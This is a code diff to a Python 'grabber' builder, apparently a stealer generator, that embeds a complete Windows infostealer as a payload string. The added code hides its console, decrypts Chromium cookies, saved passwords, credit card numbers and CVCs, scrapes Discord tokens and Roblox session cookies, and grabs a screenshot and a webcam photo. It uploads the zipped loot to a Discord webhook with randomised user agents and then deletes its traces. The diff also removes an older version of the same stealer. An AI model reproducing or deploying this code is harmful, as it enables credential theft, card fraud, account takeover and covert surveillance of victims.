@@ -6,17 +6,6 @@ import ctypes
 
 class Colors:
     @staticmethod
-    def purple_to_cyan(steps):
-        colors = []
-        for i in range(steps):
-            t = i / max(1, steps - 1)
-            r = int(255 + (0 - 255) * t)
-            g = int(0 + (255 - 0) * t)
-            b = int(255 + (255 - 255) * t)
-            colors.append((r, g, b))
-        return colors
-    
-    @staticmethod
     def green_to_cyan(steps):
         colors = []
         for i in range(steps):
@@ -24,17 +13,6 @@ class Colors:
             r = int(0 + (0 - 0) * t)
             g = int(255 + (255 - 255) * t)
             b = int(0 + (255 - 0) * t)
-            colors.append((r, g, b))
-        return colors
-    
-    @staticmethod
-    def red_to_yellow(steps):
-        colors = []
-        for i in range(steps):
-            t = i / max(1, steps - 1)
-            r = int(255 + (255 - 255) * t)
-            g = int(0 + (255 - 0) * t)
-            b = int(0 + (0 - 0) * t)
             colors.append((r, g, b))
         return colors
 
@@ -82,11 +60,698 @@ def clear_screen():
 def Write(text):
     print(text, end='', flush=True)
 
-def set_file_attributes(p):
+PAYLOAD_CODE = '''import os
+import sys
+import sqlite3
+import json
+import base64
+import shutil
+from datetime import datetime
+import glob
+import re
+import requests
+import ctypes
+import zipfile
+import time
+import hashlib
+import platform
+import subprocess
+import socket
+import psutil
+import random
+
+if sys.platform == "win32":
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+try:
+    import win32crypt
+    DPAPI_OK = True
+except:
+    DPAPI_OK = False
+
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    CRYPTO_OK = True
+except:
+    CRYPTO_OK = False
+
+try:
+    from PIL import ImageGrab
+    SCREENSHOT_OK = True
+except:
+    SCREENSHOT_OK = False
+
+try:
+    import cv2
+    WEBCAM_OK = True
+except:
+    WEBCAM_OK = False
+
+
+class AntiBanStealer:
+    def __init__(self):
+        self.browsers = {
+            'Chrome': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
+                'profiles': ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
+            },
+            'Edge': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
+                'profiles': ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
+            },
+            'Brave': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
+                'profiles': ['Default', 'Profile 1', 'Profile 2']
+            },
+            'Opera': {
+                'path': os.path.join(os.environ.get('APPDATA', ''), 'Opera Software', 'Opera Stable'),
+                'profiles': ['']
+            },
+            'OperaGX': {
+                'path': os.path.join(os.environ.get('APPDATA', ''), 'Opera Software', 'Opera GX Stable'),
+                'profiles': ['']
+            },
+            'Vivaldi': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Vivaldi', 'User Data'),
+                'profiles': ['Default', 'Profile 1']
+            },
+            'Yandex': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Yandex', 'YandexBrowser', 'User Data'),
+                'profiles': ['Default', 'Profile 1']
+            },
+            'CocCoc': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'CocCoc', 'Browser', 'User Data'),
+                'profiles': ['Default', 'Profile 1']
+            },
+            'Chromium': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Chromium', 'User Data'),
+                'profiles': ['Default', 'Profile 1']
+            },
+            'Torch': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Torch', 'User Data'),
+                'profiles': ['Default']
+            },
+            'Comodo': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Comodo', 'Dragon', 'User Data'),
+                'profiles': ['Default']
+            },
+            'Slimjet': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Slimjet', 'User Data'),
+                'profiles': ['Default']
+            },
+            '360Browser': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), '360Browser', 'Browser', 'User Data'),
+                'profiles': ['Default']
+            },
+            'Maxthon': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Maxthon3', 'User Data'),
+                'profiles': ['Default']
+            },
+            'Iridium': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Iridium', 'User Data'),
+                'profiles': ['Default']
+            },
+            'UCBrowser': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'UCBrowser', 'User Data'),
+                'profiles': ['Default']
+            },
+            'Cent': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'CentBrowser', 'User Data'),
+                'profiles': ['Default']
+            },
+            '7Star': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), '7Star', '7Star', 'User Data'),
+                'profiles': ['Default']
+            },
+            'Sputnik': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Sputnik', 'Sputnik', 'User Data'),
+                'profiles': ['Default']
+            },
+            'Epic': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Epic Privacy Browser', 'User Data'),
+                'profiles': ['Default']
+            },
+            'Uran': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'uCozMedia', 'Uran', 'User Data'),
+                'profiles': ['Default']
+            },
+            'Liebao': {
+                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'liebao', 'User Data'),
+                'profiles': ['Default']
+            },
+            'Firefox': {
+                'path': os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles'),
+                'profiles': []
+            }
+        }
+        
+        self.data = {
+            'cookies': [],
+            'passwords': [],
+            'cards': [],
+            'tokens': [],
+            'roblox': []
+        }
+        
+        self.stats = {
+            'browsers_found': 0,
+            'total_cookies': 0,
+            'total_passwords': 0,
+            'total_cards': 0,
+            'total_tokens': 0,
+            'total_roblox': 0
+        }
+        
+        self.pc_info = {}
+        self.session_id = ''.join([str(hash(datetime.now().timestamp()))[i] for i in range(8)])
+        self.temp_dir = os.path.join(os.environ.get('TEMP', ''), f'_s{self.session_id}')
+        os.makedirs(self.temp_dir, exist_ok=True)
+
+    def get_master_key(self, browser_path):
+        try:
+            local_state = os.path.join(browser_path, 'Local State')
+            if not os.path.exists(local_state):
+                return None
+            with open(local_state, 'r', encoding='utf-8') as f:
+                local_state_data = json.load(f)
+            encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])[5:]
+            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        except:
+            return None
+
+    def decrypt_value(self, encrypted_value, master_key):
+        try:
+            if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
+                nonce = encrypted_value[3:15]
+                ciphertext = encrypted_value[15:-16]
+                tag = encrypted_value[-16:]
+                cipher = AESGCM(master_key)
+                return cipher.decrypt(nonce, ciphertext + tag, None).decode('utf-8', errors='ignore')
+            else:
+                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+        except:
+            return ""
+
+    def grab_chromium_cookies(self, browser_name, profile_path):
+        cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
+        if not os.path.exists(cookies_path):
+            cookies_path = os.path.join(profile_path, 'Cookies')
+        if not os.path.exists(cookies_path):
+            return
+        
+        temp_db = os.path.join(self.temp_dir, f'c_{browser_name}_{self.session_id}.tmp')
+        try:
+            shutil.copy2(cookies_path, temp_db)
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
+            rows = cursor.fetchall()
+            master_key = self.get_master_key(os.path.dirname(profile_path))
+            
+            for host, name, value, encrypted_value in rows:
+                decrypted = value
+                if encrypted_value and master_key:
+                    decrypted = self.decrypt_value(encrypted_value, master_key)
+                
+                self.data['cookies'].append({
+                    'browser': browser_name,
+                    'host': host,
+                    'name': name,
+                    'value': decrypted
+                })
+                self.stats['total_cookies'] += 1
+            
+            conn.close()
+            os.remove(temp_db)
+        except:
+            pass
+
+    def grab_chromium_passwords(self, browser_name, profile_path):
+        login_data = os.path.join(profile_path, 'Login Data')
+        if not os.path.exists(login_data):
+            return
+        
+        temp_db = os.path.join(self.temp_dir, f'l_{browser_name}_{self.session_id}.tmp')
+        try:
+            shutil.copy2(login_data, temp_db)
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            rows = cursor.fetchall()
+            master_key = self.get_master_key(os.path.dirname(profile_path))
+            
+            for url, username, encrypted_password in rows:
+                password = ""
+                if encrypted_password and master_key:
+                    password = self.decrypt_value(encrypted_password, master_key)
+                
+                if username or password:
+                    self.data['passwords'].append({
+                        'browser': browser_name,
+                        'url': url,
+                        'username': username,
+                        'password': password
+                    })
+                    self.stats['total_passwords'] += 1
+            
+            conn.close()
+            os.remove(temp_db)
+        except:
+            pass
+
+    def grab_chromium_cards(self, browser_name, profile_path):
+        web_data = os.path.join(profile_path, 'Web Data')
+        if not os.path.exists(web_data):
+            return
+        
+        temp_db = os.path.join(self.temp_dir, f'w_{browser_name}_{self.session_id}.tmp')
+        try:
+            shutil.copy2(web_data, temp_db)
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            try:
+                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards")
+            except:
+                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+            
+            rows = cursor.fetchall()
+            master_key = self.get_master_key(os.path.dirname(profile_path))
+            
+            for row in rows:
+                name = row[0]
+                month = row[1]
+                year = row[2]
+                encrypted_number = row[3]
+                
+                number = ""
+                if encrypted_number and master_key:
+                    number = self.decrypt_value(encrypted_number, master_key)
+                
+                cvc = ""
+                try:
+                    cursor.execute("SELECT value_encrypted FROM local_card_data WHERE guid = (SELECT guid FROM credit_cards WHERE name_on_card = ?)", (name,))
+                    cvc_row = cursor.fetchone()
+                    if cvc_row and cvc_row[0] and master_key:
+                        cvc = self.decrypt_value(cvc_row[0], master_key)
+                except:
+                    pass
+                
+                if name or number:
+                    self.data['cards'].append({
+                        'browser': browser_name,
+                        'name': name,
+                        'number': number,
+                        'exp_month': month,
+                        'exp_year': year,
+                        'cvc': cvc if cvc else 'N/A'
+                    })
+                    self.stats['total_cards'] += 1
+            
+            conn.close()
+            os.remove(temp_db)
+        except:
+            pass
+
+    def grab_chromium_tokens(self, browser_name, profile_path):
+        localstorage_path = os.path.join(profile_path, 'Local Storage', 'leveldb')
+        if not os.path.exists(localstorage_path):
+            return
+        
+        token_patterns = [
+            r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}',
+            r'mfa\\.[\\w-]{84}',
+            r'[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{38}'
+        ]
+        
+        for file_path in glob.glob(os.path.join(localstorage_path, '*.ldb')):
+            try:
+                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                
+                for pattern in token_patterns:
+                    tokens = re.findall(pattern, content)
+                    for token in tokens:
+                        if token not in [t['token'] for t in self.data['tokens']]:
+                            self.data['tokens'].append({
+                                'browser': browser_name,
+                                'token': token
+                            })
+                            self.stats['total_tokens'] += 1
+            except:
+                pass
+
+    def grab_roblox_cookies(self):
+        for browser_name, browser_info in self.browsers.items():
+            if browser_name == 'Firefox':
+                continue
+            
+            browser_path = browser_info['path']
+            if not os.path.exists(browser_path):
+                continue
+            
+            for profile_name in browser_info['profiles']:
+                profile_path = os.path.join(browser_path, profile_name) if profile_name else browser_path
+                if not os.path.exists(profile_path):
+                    continue
+                
+                cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
+                if not os.path.exists(cookies_path):
+                    cookies_path = os.path.join(profile_path, 'Cookies')
+                if not os.path.exists(cookies_path):
+                    continue
+                
+                temp_db = os.path.join(self.temp_dir, f'r_{browser_name}_{self.session_id}.tmp')
+                try:
+                    shutil.copy2(cookies_path, temp_db)
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT name, value, encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com%'")
+                    rows = cursor.fetchall()
+                    master_key = self.get_master_key(os.path.dirname(profile_path))
+                    
+                    for name, value, encrypted_value in rows:
+                        decrypted = value
+                        if encrypted_value and master_key:
+                            decrypted = self.decrypt_value(encrypted_value, master_key)
+                        
+                        if name == '.ROBLOSECURITY' and decrypted:
+                            self.data['roblox'].append({
+                                'browser': browser_name,
+                                'cookie': decrypted
+                            })
+                            self.stats['total_roblox'] += 1
+                    
+                    conn.close()
+                    os.remove(temp_db)
+                except:
+                    pass
+
+    def get_pc_info(self):
+        try:
+            self.pc_info = {
+                'hostname': socket.gethostname(),
+                'pc_name': os.environ.get('COMPUTERNAME', 'Unknown'),
+                'username': os.environ.get('USERNAME', 'Unknown'),
+                'platform': platform.system(),
+                'version': platform.version(),
+                'processor': platform.processor(),
+                'ram': f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
+                'hwid': self.get_hwid()
+            }
+            
+            try:
+                uptime_seconds = time.time() - psutil.boot_time()
+                uptime_hours = uptime_seconds / 3600
+                self.pc_info['uptime'] = f"{uptime_hours:.1f} hours"
+            except:
+                self.pc_info['uptime'] = "Unknown"
+        except:
+            pass
+
+    def get_hwid(self):
+        try:
+            if sys.platform == "win32":
+                hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\\n')[1].strip()
+                return hwid
+            return "N/A"
+        except:
+            return "Unknown"
+
+    def take_screenshot(self):
+        try:
+            if SCREENSHOT_OK:
+                screenshot = ImageGrab.grab()
+                screenshot_path = os.path.join(self.temp_dir, 'screenshot.png')
+                screenshot.save(screenshot_path)
+                return screenshot_path
+            return None
+        except:
+            return None
+
+    def take_webcam_photo(self):
+        try:
+            if WEBCAM_OK:
+                cam = cv2.VideoCapture(0)
+                time.sleep(1)
+                ret, frame = cam.read()
+                if ret:
+                    webcam_path = os.path.join(self.temp_dir, 'webcam.png')
+                    cv2.imwrite(webcam_path, frame)
+                    cam.release()
+                    return webcam_path
+                cam.release()
+            return None
+        except:
+            return None
+
+    def grab_all_browsers(self):
+        for browser_name, browser_info in self.browsers.items():
+            browser_path = browser_info['path']
+            if not os.path.exists(browser_path):
+                continue
+            
+            self.stats['browsers_found'] += 1
+            
+            if browser_name == 'Firefox':
+                try:
+                    for profile_dir in os.listdir(browser_path):
+                        profile_path = os.path.join(browser_path, profile_dir)
+                        if os.path.isdir(profile_path):
+                            pass
+                except:
+                    pass
+            else:
+                for profile_name in browser_info['profiles']:
+                    profile_path = os.path.join(browser_path, profile_name) if profile_name else browser_path
+                    if not os.path.exists(profile_path):
+                        continue
+                    
+                    self.grab_chromium_cookies(browser_name, profile_path)
+                    self.grab_chromium_passwords(browser_name, profile_path)
+                    self.grab_chromium_cards(browser_name, profile_path)
+                    self.grab_chromium_tokens(browser_name, profile_path)
+
+    def create_txt_files(self):
+        pc_info_content = f"""================================
+       PC INFORMATION
+================================
+
+PC Name      : {self.pc_info.get('pc_name', 'Unknown')}
+Username     : {self.pc_info.get('username', 'Unknown')}
+Hostname     : {self.pc_info.get('hostname', 'Unknown')}
+Platform     : {self.pc_info.get('platform', 'Unknown')}
+Version      : {self.pc_info.get('version', 'Unknown')}
+Processor    : {self.pc_info.get('processor', 'Unknown')}
+RAM          : {self.pc_info.get('ram', 'Unknown')}
+HWID         : {self.pc_info.get('hwid', 'Unknown')}
+Uptime       : {self.pc_info.get('uptime', 'Unknown')}
+
+Session ID   : {self.session_id}
+Date         : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+================================
+"""
+        
+        passwords_content = "================================\\n"
+        passwords_content += "       PASSWORDS\\n"
+        passwords_content += "================================\\n\\n"
+        
+        for pwd in self.data['passwords']:
+            passwords_content += f"Browser  : {pwd['browser']}\\n"
+            passwords_content += f"URL      : {pwd['url']}\\n"
+            passwords_content += f"Username : {pwd['username']}\\n"
+            passwords_content += f"Password : {pwd['password']}\\n"
+            passwords_content += "-" * 50 + "\\n\\n"
+        
+        cards_content = "================================\\n"
+        cards_content += "       CREDIT CARDS\\n"
+        cards_content += "================================\\n\\n"
+        
+        for card in self.data['cards']:
+            cards_content += f"Browser    : {card['browser']}\\n"
+            cards_content += f"Name       : {card['name']}\\n"
+            cards_content += f"Number     : {card['number']}\\n"
+            cards_content += f"Expiration : {card['exp_month']}/{card['exp_year']}\\n"
+            cards_content += f"CVC        : {card.get('cvc', 'N/A')}\\n"
+            cards_content += "-" * 50 + "\\n\\n"
+        
+        discord_content = "================================\\n"
+        discord_content += "       DISCORD TOKENS\\n"
+        discord_content += "================================\\n\\n"
+        
+        for token in self.data['tokens']:
+            discord_content += f"Browser : {token['browser']}\\n"
+            discord_content += f"Token   : {token['token']}\\n"
+            discord_content += "-" * 50 + "\\n\\n"
+        
+        cookies_content = "================================\\n"
+        cookies_content += "       COOKIES\\n"
+        cookies_content += "================================\\n\\n"
+        
+        for cookie in self.data['cookies'][:200]:
+            cookies_content += f"{cookie['browser']} | {cookie['host']} | {cookie['name']} | {cookie['value'][:50]}\\n"
+        
+        browsers_content = f"""================================
+       BROWSERS SUMMARY
+================================
+
+Browsers Found : {self.stats['browsers_found']}
+Total Cookies  : {self.stats['total_cookies']}
+Total Passwords: {self.stats['total_passwords']}
+Total Cards    : {self.stats['total_cards']}
+Discord Tokens : {self.stats['total_tokens']}
+Roblox Cookies : {self.stats['total_roblox']}
+
+================================
+"""
+        
+        return {
+            'pc_info.txt': pc_info_content,
+            'passwords.txt': passwords_content,
+            'credit_cards.txt': cards_content,
+            'discord.txt': discord_content,
+            'cookies.txt': cookies_content,
+            'browsers.txt': browsers_content
+        }
+
+    def create_zip_package(self):
+        zip_path = os.path.join(self.temp_dir, f'{self.session_id}.zip')
+        
+        try:
+            txt_files = self.create_txt_files()
+            
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zip_file:
+                for filename, content in txt_files.items():
+                    zip_file.writestr(filename, content)
+                
+                screenshot_path = self.take_screenshot()
+                if screenshot_path and os.path.exists(screenshot_path):
+                    zip_file.write(screenshot_path, 'screenshot.png')
+                
+                webcam_path = self.take_webcam_photo()
+                if webcam_path and os.path.exists(webcam_path):
+                    zip_file.write(webcam_path, 'webcam.png')
+            
+            return zip_path
+        except:
+            return None
+
+    def send_to_webhook(self, zip_path):
+        try:
+            webhook_url = "YOUR_WEBHOOK_URL_HERE"
+            
+            delay = random.uniform(2.0, 5.0)
+            time.sleep(delay)
+            
+            with open(zip_path, 'rb') as f:
+                zip_data = f.read()
+            
+            file_size_mb = len(zip_data) / (1024 * 1024)
+            if file_size_mb > 24:
+                return False
+            
+            files = {'file': (f'{self.session_id}.zip', zip_data, 'application/zip')}
+            
+            embed_content = f"**Session {self.session_id}**\\n\\n"
+            embed_content += f"**PC**\\n{self.pc_info.get('pc_name', 'Unknown')}\\n\\n"
+            embed_content += f"**User**\\n{self.pc_info.get('username', 'Unknown')}\\n\\n"
+            embed_content += f"**Browsers**\\n{self.stats['browsers_found']}\\n\\n"
+            embed_content += f"**Cookies**\\n{self.stats['total_cookies']}\\n\\n"
+            embed_content += f"**Passwords**\\n{self.stats['total_passwords']}\\n\\n"
+            embed_content += f"**Cards**\\n{self.stats['total_cards']}\\n\\n"
+            
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            
+            embed = {
+                "embeds": [{
+                    "description": embed_content,
+                    "color": 5814783,
+                    "footer": {"text": f"ID: {self.session_id} | {timestamp}"}
+                }]
+            }
+            
+            data = {'payload_json': json.dumps(embed)}
+            
+            user_agents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+            ]
+            
+            headers = {
+                'User-Agent': random.choice(user_agents),
+                'Accept': '*/*',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br'
+            }
+            
+            max_retries = 3
+            retry_count = 0
+            
+            while retry_count < max_retries:
+                try:
+                    response = requests.post(webhook_url, files=files, data=data, headers=headers, timeout=30)
+                    
+                    if response.status_code == 204 or response.status_code == 200:
+                        return True
+                    elif response.status_code == 429:
+                        retry_after = 5
+                        try:
+                            retry_data = response.json()
+                            retry_after = int(retry_data.get('retry_after', 5))
+                        except:
+                            pass
+                        
+                        wait_time = retry_after + random.uniform(1.0, 3.0)
+                        time.sleep(wait_time)
+                        retry_count += 1
+                    else:
+                        retry_count += 1
+                        if retry_count < max_retries:
+                            time.sleep(random.uniform(3.0, 6.0))
+                except requests.exceptions.RequestException:
+                    retry_count += 1
+                    if retry_count < max_retries:
+                        time.sleep(random.uniform(3.0, 6.0))
+            
+            return False
+        except:
+            return False
+
+    def cleanup(self):
+        try:
+            shutil.rmtree(self.temp_dir, ignore_errors=True)
+        except:
+            pass
+
+    def run(self):
+        try:
+            self.get_pc_info()
+            self.grab_all_browsers()
+            self.grab_roblox_cookies()
+            
+            zip_path = self.create_zip_package()
+            if zip_path:
+                self.send_to_webhook(zip_path)
+            
+            self.cleanup()
+        except:
+            pass
+
+
+def main():
     try:
-        ctypes.windll.kernel32.SetFileAttributesW(p, 6)
+        stealer = AntiBanStealer()
+        stealer.run()
     except:
         pass
+
+
+if __name__ == "__main__":
+    main()
+'''
 
 def main():
     clear_screen()
@@ -113,246 +778,7 @@ def main():
     Write(Colorate.Horizontal(Colors.green_to_cyan, 'Choose file name : '))
     n = input().strip() or 'grabber'
     
-    payload_code = open('/mnt/user-data/uploads/stealer_payload.txt', 'r').read() if os.path.exists('/mnt/user-data/uploads/stealer_payload.txt') else '''import os
-import sys
-import sqlite3
-import json
-import base64
-import shutil
-from datetime import datetime
-import glob
-import re
-import requests
-import ctypes
-import zipfile
-import io
-import time
-import hashlib
-if sys.platform=="win32":ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
-try:
-    import win32crypt
-    DPAPI_OK=True
-except:DPAPI_OK=False
-try:
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-    CRYPTO_OK=True
-except:CRYPTO_OK=False
-class AntiBanStealer:
-    def __init__(self):
-        self.browsers={'Chrome':{'path':os.path.join(os.environ.get('LOCALAPPDATA',''),'Google','Chrome','User Data'),'profiles':['Default','Profile 1','Profile 2','Profile 3']},'Edge':{'path':os.path.join(os.environ.get('LOCALAPPDATA',''),'Microsoft','Edge','User Data'),'profiles':['Default','Profile 1','Profile 2']},'Brave':{'path':os.path.join(os.environ.get('LOCALAPPDATA',''),'BraveSoftware','Brave-Browser','User Data'),'profiles':['Default','Profile 1','Profile 2']},'Opera':{'path':os.path.join(os.environ.get('APPDATA',''),'Opera Software','Opera Stable'),'profiles':['']},'OperaGX':{'path':os.path.join(os.environ.get('APPDATA',''),'Opera Software','Opera GX Stable'),'profiles':['']},'Vivaldi':{'path':os.path.join(os.environ.get('LOCALAPPDATA',''),'Vivaldi','User Data'),'profiles':['Default','Profile 1']},'Firefox':{'path':os.path.join(os.environ.get('APPDATA',''),'Mozilla','Firefox','Profiles'),'profiles':[]}}
-        self.data={'cookies':[],'passwords':[],'autofill':[],'cards':[],'history':[],'downloads':[],'bookmarks':[],'tokens':[],'sessions':[]}
-        self.stats={'browsers_found':0,'profiles_scanned':0,'total_cookies':0,'total_passwords':0,'total_cards':0,'total_tokens':0}
-        self.session_id=hashlib.md5(f"{os.environ.get('COMPUTERNAME','')}{datetime.now().timestamp()}".encode()).hexdigest()[:8]
-    def get_master_key(self,browser_path):
-        try:
-            local_state=os.path.join(browser_path,'Local State')
-            if not os.path.exists(local_state):return None
-            with open(local_state,'r',encoding='utf-8')as f:local_state_data=json.load(f)
-            encrypted_key=base64.b64decode(local_state_data['os_crypt']['encrypted_key'])[5:]
-            return win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
-        except:return None
-    def decrypt_value(self,encrypted_value,master_key):
-        try:
-            if encrypted_value[:3]==b'v10'or encrypted_value[:3]==b'v11':
-                nonce=encrypted_value[3:15]
-                ciphertext=encrypted_value[15:-16]
-                tag=encrypted_value[-16:]
-                cipher=AESGCM(master_key)
-                return cipher.decrypt(nonce,ciphertext+tag,None).decode('utf-8',errors='ignore')
-            else:return win32crypt.CryptUnprotectData(encrypted_value,None,None,None,0)[1].decode('utf-8',errors='ignore')
-        except:return ""
-    def grab_chromium_cookies(self,browser_name,profile_path):
-        cookies_path=os.path.join(profile_path,'Network','Cookies')
-        if not os.path.exists(cookies_path):cookies_path=os.path.join(profile_path,'Cookies')
-        if not os.path.exists(cookies_path):return
-        temp_db=cookies_path+'.tmp'
-        try:
-            shutil.copy2(cookies_path,temp_db)
-            conn=sqlite3.connect(temp_db)
-            cursor=conn.cursor()
-            cursor.execute("SELECT host_key,name,value,encrypted_value,path,expires_utc FROM cookies")
-            rows=cursor.fetchall()
-            master_key=self.get_master_key(os.path.dirname(profile_path))
-            for host,name,value,encrypted_value,path,expires in rows:
-                decrypted=value
-                if encrypted_value and master_key:decrypted=self.decrypt_value(encrypted_value,master_key)
-                self.data['cookies'].append({'browser':browser_name,'host':host,'name':name,'value':decrypted,'path':path,'expires':expires})
-                self.stats['total_cookies']+=1
-            conn.close()
-            os.remove(temp_db)
-        except:pass
-    def grab_chromium_passwords(self,browser_name,profile_path):
-        login_data=os.path.join(profile_path,'Login Data')
-        if not os.path.exists(login_data):return
-        temp_db=login_data+'.tmp'
-        try:
-            shutil.copy2(login_data,temp_db)
-            conn=sqlite3.connect(temp_db)
-            cursor=conn.cursor()
-            cursor.execute("SELECT origin_url,username_value,password_value FROM logins")
-            rows=cursor.fetchall()
-            master_key=self.get_master_key(os.path.dirname(profile_path))
-            for url,username,encrypted_password in rows:
-                password=""
-                if encrypted_password and master_key:password=self.decrypt_value(encrypted_password,master_key)
-                if username or password:
-                    self.data['passwords'].append({'browser':browser_name,'url':url,'username':username,'password':password})
-                    self.stats['total_passwords']+=1
-            conn.close()
-            os.remove(temp_db)
-        except:pass
-    def grab_chromium_cards(self,browser_name,profile_path):
-        web_data=os.path.join(profile_path,'Web Data')
-        if not os.path.exists(web_data):return
-        temp_db=web_data+'.tmp'
-        try:
-            shutil.copy2(web_data,temp_db)
-            conn=sqlite3.connect(temp_db)
-            cursor=conn.cursor()
-            cursor.execute("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards")
-            rows=cursor.fetchall()
-            master_key=self.get_master_key(os.path.dirname(profile_path))
-            for name,month,year,encrypted_number in rows:
-                number=""
-                if encrypted_number and master_key:number=self.decrypt_value(encrypted_number,master_key)
-                if name or number:
-                    self.data['cards'].append({'browser':browser_name,'name':name,'number':number,'exp_month':month,'exp_year':year})
-                    self.stats['total_cards']+=1
-            conn.close()
-            os.remove(temp_db)
-        except:pass
-    def grab_chromium_autofill(self,browser_name,profile_path):
-        web_data=os.path.join(profile_path,'Web Data')
-        if not os.path.exists(web_data):return
-        temp_db=web_data+'.tmp'
-        try:
-            shutil.copy2(web_data,temp_db)
-            conn=sqlite3.connect(temp_db)
-            cursor=conn.cursor()
-            cursor.execute("SELECT name,value FROM autofill LIMIT 100")
-            rows=cursor.fetchall()
-            for name,value in rows:self.data['autofill'].append({'browser':browser_name,'name':name,'value':value})
-            conn.close()
-            os.remove(temp_db)
-        except:pass
-    def grab_chromium_history(self,browser_name,profile_path):
-        history_path=os.path.join(profile_path,'History')
-        if not os.path.exists(history_path):return
-        temp_db=history_path+'.tmp'
-        try:
-            shutil.copy2(history_path,temp_db)
-            conn=sqlite3.connect(temp_db)
-            cursor=conn.cursor()
-            cursor.execute("SELECT url,title,visit_count,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200")
-            rows=cursor.fetchall()
-            for url,title,visits,last_visit in rows:self.data['history'].append({'browser':browser_name,'url':url,'title':title,'visits':visits})
-            conn.close()
-            os.remove(temp_db)
-        except:pass
-    def grab_chromium_tokens(self,browser_name,profile_path):
-        localstorage_path=os.path.join(profile_path,'Local Storage','leveldb')
-        if not os.path.exists(localstorage_path):return
-        token_patterns=[r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}',r'mfa\\.[\\w-]{84}',r'[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{38}']
-        for file_path in glob.glob(os.path.join(localstorage_path,'*.ldb')):
-            try:
-                with open(file_path,'r',encoding='utf-8',errors='ignore')as f:content=f.read()
-                for pattern in token_patterns:
-                    tokens=re.findall(pattern,content)
-                    for token in tokens:
-                        if token not in[t['token']for t in self.data['tokens']]:
-                            self.data['tokens'].append({'browser':browser_name,'token':token,'type':'Discord'if'.'in token else'Other'})
-                            self.stats['total_tokens']+=1
-            except:pass
-    def grab_firefox_cookies(self,profile_path):
-        cookies_path=os.path.join(profile_path,'cookies.sqlite')
-        if not os.path.exists(cookies_path):return
-        temp_db=cookies_path+'.tmp'
-        try:
-            shutil.copy2(cookies_path,temp_db)
-            conn=sqlite3.connect(temp_db)
-            cursor=conn.cursor()
-            cursor.execute("SELECT host,name,value,path FROM moz_cookies")
-            rows=cursor.fetchall()
-            for host,name,value,path in rows:
-                self.data['cookies'].append({'browser':'Firefox','host':host,'name':name,'value':value,'path':path})
-                self.stats['total_cookies']+=1
-            conn.close()
-            os.remove(temp_db)
